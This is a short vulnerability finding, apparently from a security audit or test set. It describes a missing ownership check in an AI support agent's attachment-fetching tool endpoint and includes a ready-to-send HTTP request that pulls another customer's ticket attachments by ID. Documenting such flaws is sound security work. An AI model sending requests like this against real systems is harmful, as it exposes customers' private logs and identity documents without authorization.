diagnosis: The support agent tool endpoint extracts ticket_id directly from arguments_json and retrieves associated attachments without validating that the authenticated customer is the author or assignee of ticket_id. An authenticated customer can supply other customers' ticket_ids to retrieve private support attachments such as error logs, personally identifiable documents, or diagnostic archives.
exploit_request:
POST /agent/support/tools/fetch-attachments HTTP/1.1
Host: support-ai.clouddesk.com
Authorization: Bearer <customer_token>
Content-Type: application/json

{"function_name": "get_ticket_attachments", "arguments_json": "{\"ticket_id\": \"TCK-89211\"}"}
